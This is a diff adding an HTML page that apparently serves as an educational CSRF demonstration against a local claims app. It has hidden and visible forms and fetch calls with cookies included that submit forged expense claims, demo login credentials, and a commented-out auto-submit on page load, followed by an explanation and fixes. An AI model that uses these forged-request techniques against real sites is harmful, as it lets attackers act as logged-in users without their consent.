@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Attack Demo</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #f5f5f5;
+        }
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .warning {
+            background-color: #fee2e2;
+            color: #991b1b;
+            padding: 15px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            border: 1px solid #fecaca;
+        }
+        .success {
+            background-color: #d1fae5;
+            color: #065f46;
+            padding: 15px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            border: 1px solid #a7f3d0;
+        }
+        .info {
+            background-color: #dbeafe;
+            color: #1e40af;
+            padding: 15px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            border: 1px solid #93c5fd;
+        }
+        button {
+            background-color: #dc2626;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            margin: 10px 5px;
+        }
+        button:hover {
+            background-color: #b91c1c;
+        }
+        .safe-button {
+            background-color: #059669;
+        }
+        .safe-button:hover {
+            background-color: #047857;
+        }
+        .form-container {
+            background-color: #f9fafb;
+            padding: 20px;
+            border-radius: 5px;
+            margin: 20px 0;
+        }
+        .hidden-form {
+            display: none;
+        }
+        code {
+            background-color: #f3f4f6;
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-family: 'Courier New', monospace;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🚨 CSRF Attack Demonstration</h1>
+        
+        <div class="warning">
+            <strong>⚠️ WARNING:</strong> This is a demonstration of Cross-Site Request Forgery (CSRF) attacks. 
+            This page is designed for educational purposes only to show how CSRF vulnerabilities work.
+        </div>
+
+        <div class="info">
+            <strong>📋 Instructions:</strong>
+            <ol>
+                <li>First, log into the Claim Manager application at <code>https://localhost:3000</code></li>
+                <li>Login as <code>alice</code> with password <code>password123</code></li>
+                <li>Then come back to this page and click the attack buttons below</li>
+                <li>Check the Claim Manager app to see if claims were created</li>
+            </ol>
+        </div>
+
+        <h2>🎯 CSRF Attack Methods</h2>
+
+        <div class="form-container">
+            <h3>Method 1: Automatic Form Submission</h3>
+            <p>This form will automatically submit when the page loads (if you're logged in):</p>
+            
+            <form id="csrfForm" action="https://localhost:5001/api/claims" method="POST" class="hidden-form">
+                <input type="hidden" name="title" value="🚨 CSRF Attack - Auto Submit">
+                <input type="hidden" name="description" value="This claim was created via CSRF attack without user consent!">
+                <input type="hidden" name="amount" value="999.99">
+                <input type="hidden" name="category" value="Other">
+            </form>
+            
+            <button onclick="submitCSRF()">Execute CSRF Attack (Auto Submit)</button>
+            <button onclick="showForm()" class="safe-button">Show Hidden Form</button>
+        </div>
+
+        <div class="form-container">
+            <h3>Method 2: Manual Form Submission</h3>
+            <p>This form requires user interaction but still demonstrates CSRF:</p>
+            
+            <form id="manualForm" action="https://localhost:5001/api/claims" method="POST">
+                <div style="margin: 10px 0;">
+                    <label>Claim Title:</label><br>
+                    <input type="text" name="title" value="🚨 CSRF Attack - Manual" style="width: 100%; padding: 5px; margin: 5px 0;">
+                </div>
+                <div style="margin: 10px 0;">
+                    <label>Description:</label><br>
+                    <textarea name="description" style="width: 100%; padding: 5px; margin: 5px 0;">This claim was created via CSRF attack!</textarea>
+                </div>
+                <div style="margin: 10px 0;">
+                    <label>Amount:</label><br>
+                    <input type="number" name="amount" value="500.00" step="0.01" style="width: 100%; padding: 5px; margin: 5px 0;">
+                </div>
+                <div style="margin: 10px 0;">
+                    <label>Category:</label><br>
+                    <select name="category" style="width: 100%; padding: 5px; margin: 5px 0;">
+                        <option value="Other">Other</option>
+                        <option value="Travel">Travel</option>
+                        <option value="Meals">Meals</option>
+                        <option value="Office Supplies">Office Supplies</option>
+                        <option value="Training">Training</option>
+                    </select>
+                </div>
+                <button type="submit">Submit CSRF Attack</button>
+            </form>
+        </div>
+
+        <div class="form-container">
+            <h3>Method 3: JavaScript Fetch with JSON (Advanced)</h3>
+            <p>This uses JavaScript Fetch API to send JSON requests programmatically (backend supports both forms and JSON):</p>
+            
+            <button onclick="fetchCSRF()">Execute CSRF via Fetch API (JSON)</button>
+            <button onclick="fetchCSRFWithCredentials()">CSRF with Credentials (JSON)</button>
+        </div>
+
+        <div class="success" id="result" style="display: none;">
+            <strong>✅ Success!</strong> <span id="resultText"></span>
+        </div>
+
+        <div class="warning" id="error" style="display: none;">
+            <strong>❌ Error:</strong> <span id="errorText"></span>
+        </div>
+
+        <h2>🔍 Why This Works</h2>
+        <div class="info">
+            <p><strong>The CSRF attack works because:</strong></p>
+            <ul>
+                <li>The application uses <code>SameSite=None</code> cookies (with HTTPS) - allows cross-site requests</li>
+                <li>No CSRF tokens are required for state-changing operations</li>
+                <li>The browser automatically sends authentication cookies with form submissions and JSON requests</li>
+                <li>The application doesn't verify the origin of requests</li>
+                <li>Backend supports both form-encoded (<code>application/x-www-form-urlencoded</code>) and JSON (<code>application/json</code>) requests</li>
+            </ul>
+        </div>
+
+        <h2>🛡️ How to Fix CSRF</h2>
+        <div class="info">
+            <p><strong>To prevent CSRF attacks:</strong></p>
+            <ul>
+                <li>Use <code>SameSite=Strict</code> on cookies</li>
+                <li>Implement CSRF tokens</li>
+                <li>Verify the <code>Origin</code> and <code>Referer</code> headers</li>
+                <li>Use double-submit cookie pattern</li>
+            </ul>
+        </div>
+    </div>
+
+    <script>
+        const API_URL = 'https://localhost:5001/api/claims';
+
+        // Method 1: Automatic form submission (traditional CSRF)
+        function submitCSRF() {
+            document.getElementById('csrfForm').submit();
+        }
+
+        function showForm() {
+            const form = document.getElementById('csrfForm');
+            form.classList.remove('hidden-form');
+            form.style.display = 'block';
+        }
+
+        // Method 3: Fetch API with JSON
+        function fetchCSRF() {
+            fetch(API_URL, {
+                method: 'POST',
+                credentials: 'include', // Include cookies
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    title: '🚨 CSRF Attack - Fetch API',
+                    description: 'This claim was created via JavaScript fetch with JSON!',
+                    amount: 750.00,
+                    category: 'Other'
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                showResult('CSRF attack via Fetch API (JSON) successful! Check the Claim Manager app.');
+            })
+            .catch(error => {
+                showError('CSRF attack failed: ' + error.message);
+            });
+        }
+
+        function fetchCSRFWithCredentials() {
+            fetch(API_URL, {
+                method: 'POST',
+                credentials: 'include', // This ensures cookies are sent
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    title: '🚨 CSRF Attack - With Credentials',
+                    description: 'This claim was created with credentials included via JSON!',
+                    amount: 1250.00,
+                    category: 'Training'
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                showResult('CSRF attack with credentials (JSON) successful! Check the Claim Manager app.');
+            })
+            .catch(error => {
+                showError('CSRF attack failed: ' + error.message);
+            });
+        }
+
+        function showResult(message) {
+            document.getElementById('resultText').textContent = message;
+            document.getElementById('result').style.display = 'block';
+            document.getElementById('error').style.display = 'none';
+        }
+
+        function showError(message) {
+            document.getElementById('errorText').textContent = message;
+            document.getElementById('error').style.display = 'block';
+            document.getElementById('result').style.display = 'none';
+        }
+
+        // Auto-submit on page load (uncomment to enable)
+        // window.onload = function() {
+        //     setTimeout(submitCSRF, 2000);
+        // };
+    </script>
+</body>
+</html>
